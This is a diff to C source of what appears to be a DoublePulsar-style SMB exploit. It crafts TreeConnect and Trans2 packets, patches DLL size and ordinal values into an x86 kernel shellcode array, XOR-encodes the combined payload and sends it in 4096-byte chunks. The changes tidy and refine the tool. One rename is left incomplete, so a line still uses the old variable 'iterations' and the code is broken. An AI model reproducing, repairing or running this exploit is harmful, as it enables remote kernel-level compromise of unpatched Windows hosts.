@@ -674,7 +674,7 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
@@ -684,8 +684,8 @@ int main(int argc, char* argv[])
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
 	//Update treeID, UserID
-	memcpy(trans2_request + 28, (char*)&treeid, 2);
-	memcpy(trans2_request + 32, (char*)&userid, 2);
+	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
+	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
@@ -746,24 +746,24 @@ int main(int argc, char* argv[])
 	CloseHandle(hFile);
 
 	printf("patching DLL + x86 Userland shellcode size in Kernel shellcode...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[1425], 4);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[1425], 4);
 	*(DWORD*)&x86_kernel_rundll_shellcode[1425] = dwFileSizeLow + 3440;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[1425], 4);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[1425], 4);
 
 	printf("patching DLL size...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
 	*(DWORD*)&x86_kernel_rundll_shellcode[4861] = dwFileSizeLow;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
 	printf("patching DLL ordinal...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 4);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 4);
 	*(DWORD*)&x86_kernel_rundll_shellcode[4865] = 1;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 4);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 4);
 
 	int kernel_shellcode_size = sizeof(x86_kernel_rundll_shellcode) / sizeof(x86_kernel_rundll_shellcode[0]);
 	kernel_shellcode_size -= 1;
@@ -772,15 +772,15 @@ int main(int argc, char* argv[])
 	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
 
 	int numberofpackets = payload_totalsize / 4096;
-	int iterations = payload_totalsize % 4096;
+	int remainder = payload_totalsize % 4096;
 	printf("will send %d packets\n ", numberofpackets);
-	printf("%d as a remainder\n", iterations);
+	printf("%d as a remainder\n", remainder);
 
 	memcpy(pFULLBUFFER, x86_kernel_rundll_shellcode, 4869);
 	memcpy(pFULLBUFFER + 4869, pExeBuffer, dwFileSizeLow);
 
 	//unsigned int XorKey = 0x58581162;
-	unsigned char byte_xor_key[5];
+	unsigned char byte_xor_key[4];
 	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
@@ -806,14 +806,14 @@ int main(int argc, char* argv[])
 
 	unsigned short TotalDataCount = 4096;
 	unsigned short DataCount = 4096;
-	unsigned short byteCount = 4096 + 13;
+	unsigned short byteCount = 4096 + 12;
 
 	//unsigned char SMBDATA[4096];
 	//memset(SMBDATA, 0x00, 4096);
 	unsigned char* big_packet = (unsigned char*)malloc(4096 + 12 + 70);
 	int size_normal_packet = 4096 + 12 + 70;
 
-	unsigned char* last_packet = (unsigned char*)malloc(iterations + 12 + 70);
+	unsigned char* last_packet = (unsigned char*)malloc(remainder + 12 + 70);
 	int size_last_packet = iterations + 12 + 70;
 
 	for (ctx = 0; ctx < payload_totalsize;)
